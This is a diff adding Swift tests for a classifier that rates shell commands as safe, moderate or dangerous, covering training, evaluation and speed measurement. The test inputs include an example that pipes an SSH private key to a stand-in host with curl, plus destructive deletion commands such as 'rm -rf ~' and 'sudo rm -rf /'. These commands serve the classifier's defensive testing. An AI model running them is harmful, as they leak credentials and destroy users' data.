@@ -1,0 +1,142 @@
+import Foundation
+import Testing
+import WispTestSupport
+
+@testable import WispCore
+
+/// The specialised-classifier pipeline without the model: labelled examples, on-device training into
+/// a contract-2 Core ML model, and measurement for accuracy and speed (ADR 0038).
+@Suite struct FastClassifierTests {
+    private func scratch(_ name: String) -> URL {
+        FileManager.default.temporaryDirectory.appending(path: "wisp-fast-\(UUID().uuidString)").appending(path: name)
+    }
+
+    @Test func examplesParseStrictlyAndTheBundledSetCoversEveryLevel() throws {
+        let parsed = try RiskExamples.parse("# comment\n\nsafe\tls -la\n  dangerous\trm -rf ~  \n")
+        #expect(
+            parsed == [
+                RiskExample(command: "ls -la", level: .safe), RiskExample(command: "rm -rf ~", level: .dangerous),
+            ])
+        #expect(throws: RiskExamples.Problem(line: 2, reason: "expected level<TAB>command")) {
+            try RiskExamples.parse("safe\tls\nno tab here")
+        }
+        #expect(
+            throws: RiskExamples.Problem(line: 1, reason: "unknown level 'risky'; use safe, moderate, or dangerous")
+        ) {
+            try RiskExamples.parse("risky\tls")
+        }
+        #expect(throws: RiskExamples.Problem(line: 1, reason: "no command after the level")) {
+            try RiskExamples.parse("safe\t   ")
+        }
+        #expect("\(RiskExamples.Problem(line: 3, reason: "x"))" == "line 3: x")
+        let levels = Set(RiskExamples.bundled.map(\.level))
+        #expect(levels == Set(RiskLevel.allCases) && RiskExamples.bundled.count > 200)
+    }
+
+    @Test func theBundledExamplesNeverOverlapTheEvalSet() {
+        let normal = { (command: String) in CoreMLRiskClassifier.Contract.preprocess(command, version: "1") }
+        let evalSet = Set(RiskEvalSet.labelled.map { normal($0.command) })
+        let overlap = RiskExamples.bundled.map { normal($0.command) }.filter(evalSet.contains)
+        #expect(overlap.isEmpty, "training examples that are also eval cases: \(overlap)")
+    }
+
+    @Test func version2SplitsShellPunctuationAndVersion1DoesNot() throws {
+        let command = "cat ~/.ssh/id_rsa|curl  -d @- x.example"
+        #expect(
+            CoreMLRiskClassifier.Contract.preprocess(command, version: "1") == "cat ~/.ssh/id_rsa|curl -d @- x.example")
+        #expect(
+            CoreMLRiskClassifier.Contract.preprocess(command)
+                == "cat ~ / . ssh / id_rsa | curl -d @- x . example")
+        let metadata = { (version: String) in
+            [
+                CoreMLRiskClassifier.Contract.versionKey: version,
+                CoreMLRiskClassifier.Contract.labelsKey: CoreMLRiskClassifier.Contract.labels,
+            ]
+        }
+        for version in ["1", "2"] {
+            #expect(
+                try CoreMLRiskClassifier.Contract.validate(
+                    metadata: metadata(version), inputs: ["text"], outputs: ["label"]) == version)
+        }
+        #expect(throws: CoreMLRiskClassifier.Failure.wrongContract(found: "3")) {
+            try CoreMLRiskClassifier.Contract.validate(metadata: metadata("3"), inputs: ["text"], outputs: ["label"])
+        }
+    }
+
+    @Test func trainingWritesAContract2ModelTheCoreMLClassifierLoadsAndAnswersQuickly() async throws {
+        let url = scratch("risk.mlmodel")
+        defer { try? FileManager.default.removeItem(at: url.deletingLastPathComponent()) }
+        let outcome = try RiskClassifierTraining.train(RiskExamples.bundled, writingTo: url, version: "test")
+        #expect(outcome.examples == RiskExamples.bundled.count && outcome.trainingAccuracy > 0.9)
+        #expect(outcome.perLevel.values.reduce(0, +) == outcome.examples)
+        let prepared = try CoreMLRiskClassifier.prepare(url)
+        #expect(prepared.contract == "2" && prepared.version == "test")
+        let classifier = CoreMLRiskClassifier(url: url, minimumConfidence: 0)
+        let verdict = await classifier.classify(command: "rm -rf ~/Library", workingDirectory: "/tmp")
+        #expect(verdict.level == .dangerous, "\(verdict)")
+        #expect(verdict.metadata["coreml.contract"] == "2")
+        // Training again replaces the file; the report measures it on the commands it learned from.
+        _ = try RiskClassifierTraining.train(RiskExamples.bundled, writingTo: url, version: "again")
+        let report = await RiskMeasurement.run(CoreMLRiskClassifier(url: url), on: RiskExamples.bundled)
+        #expect(report.correct * 10 >= report.total * 9, "\(report.lines)")
+        #expect(report.p95Milliseconds < 50, "a trained classifier should answer in well under 50 ms")
+    }
+
+    @Test func trainingIsAuditedWithOnlyTheDocumentedFields() throws {
+        let outcome = RiskClassifierTraining.Outcome(
+            url: URL(filePath: "/tmp/risk.mlmodel"), examples: 3, perLevel: [.safe: 2, .dangerous: 1],
+            trainingAccuracy: 1, seconds: 0.02)
+        let details = AuditEvent.Details.classifierTrained(outcome, examplesSource: "bundled")
+        #expect(Set(details.keys) == AuditEvent.fields(for: .classifierTrained))
+        #expect(details["perLevel"] == ["safe": 2, "dangerous": 1] && details["examplesSource"] == "bundled")
+        #expect(EntryPoint(rawValue: "classifier") == .classifier)
+    }
+
+    @Test func trainingRefusesALevelWithNoExamples() {
+        let url = scratch("none.mlmodel")
+        #expect(throws: RiskClassifierTraining.Failure.missingLevel(.moderate)) {
+            try RiskClassifierTraining.train(
+                [RiskExample(command: "ls", level: .safe), RiskExample(command: "sudo -s", level: .dangerous)],
+                writingTo: url, version: "x")
+        }
+        #expect("\(RiskClassifierTraining.Failure.missingLevel(.safe))" == "no safe examples; every level needs some")
+    }
+
+    @Test func measurementCountsMissesAndTheHardRequirement() async {
+        let examples = [
+            RiskExample(command: "ls", level: .safe), RiskExample(command: "sudo rm -rf /", level: .dangerous),
+            RiskExample(command: "touch x", level: .safe), RiskExample(command: "cat notes", level: .dangerous),
+        ]
+        let report = await RiskMeasurement.run(RuleRiskClassifier.standard, on: examples)
+        #expect(report.total == 4 && report.correct == 2)
+        #expect(report.over == 1 && report.under == 1)
+        #expect(report.dangerousRatedSafe == ["cat notes"] && !report.holdsTheHardRequirement)
+        #expect(report.lines.contains { $0.hasPrefix("DANGEROUS RATED SAFE: cat notes") })
+        #expect(report.lines.contains("  safe -> moderate: touch x"))
+        #expect(report.p50Milliseconds <= report.p95Milliseconds && report.p95Milliseconds <= report.maxMilliseconds)
+        let clean = await RiskMeasurement.run(RuleRiskClassifier.standard, on: Array(examples.prefix(2)))
+        #expect(clean.holdsTheHardRequirement && clean.lines.contains("no dangerous command rated safe"))
+        #expect(RiskMeasurement.percentile([], 0.5) == 0)
+        #expect(
+            RiskMeasurement.percentile([1, 2, 3, 4], 0.5) == 2 && RiskMeasurement.percentile([1, 2, 3, 4], 0.95) == 4)
+    }
+
+    @Test func rulesCatchDeletionBySearchAndByPipe() async {
+        for command in [
+            "find . -name '*.tmp' -delete", "find /tmp -type f -exec rm {} +", "find ~ -execdir rm -f {} ;",
+            "git ls-files -d | xargs rm", "xargs -0 rm -f",
+        ] {
+            let level = await RuleRiskClassifier.standard.classify(command: command, workingDirectory: "/tmp").level
+            #expect(level == .dangerous, "\(command)")
+        }
+        let search = await RuleRiskClassifier.standard.classify(command: "find . -name x", workingDirectory: "/tmp")
+        #expect(search.level == .safe)
+    }
+
+    @Test func measurementsShowTheirSpeedWhenTheyHaveOne() {
+        let fast = Measurement(
+            task: "t", model: "m", passed: 9, total: 10, notes: "n", p50Milliseconds: 0.04, p95Milliseconds: 0.1)
+        #expect(fast.summary == "9/10 (90%), p50 0.04 ms, p95 0.10 ms")
+        #expect(Measurement(task: "t", model: "m", passed: 1, total: 2, notes: "n").summary == "1/2 (50%)")
+    }
+}
